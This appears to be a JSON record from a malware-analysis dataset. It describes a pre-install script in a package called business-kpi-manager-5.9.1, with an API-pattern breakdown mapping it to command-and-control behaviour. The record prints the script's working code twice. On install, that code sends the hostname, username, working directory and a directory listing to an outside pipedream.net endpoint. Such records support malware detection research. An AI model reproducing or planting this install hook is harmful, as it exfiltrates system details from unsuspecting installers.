[
  {
    "pyfile": "pre_install.py",
    "code_snippet": "import subprocess\n\ndef pre_install():\n    # Define your curl command here\n    curl_command = 'curl -X POST -H \"Hostname: $(hostname)\" -H \"repo: TMobile\" -H \"dependency: business-kpi-manager\" -H \"Whoami: $(whoami)\" -H \"Pwd: $(pwd)\" -d \"$(ls -la)\" -H \"Content-Type: text/plain\" https://eozjyg0uj1pesea.m.pipedream.net'\n    \n    # Execute the curl command\n    subprocess.run(curl_command, shell=True)\n\nif __name__ == \"__main__\":\n    pre_install()",
    "pattern_analysis": {
      "api_sequence": [
        "subprocess.run"
      ],
      "api_sequence_with_args": [
        "subprocess.run(curl_command, shell=True)"
      ],
      "mapped_sequence": [
        {
          "api_name": "subprocess.run",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        }
      ],
      "contextual_code": "import subprocess\n\ndef pre_install():\n    curl_command = 'curl -X POST -H \"Hostname: $(hostname)\" -H \"repo: TMobile\" -H \"dependency: business-kpi-manager\" -H \"Whoami: $(whoami)\" -H \"Pwd: $(pwd)\" -d \"$(ls -la)\" -H \"Content-Type: text/plain\" https://eozjyg0uj1pesea.m.pipedream.net'\n    subprocess.run(curl_command, shell=True)\n\nif __name__ == \"__main__\":\n    pre_install()"
    }
  },
  {
    "metadata": {
      "package_name": "business-kpi-manager-5.9.1"
    }
  }
]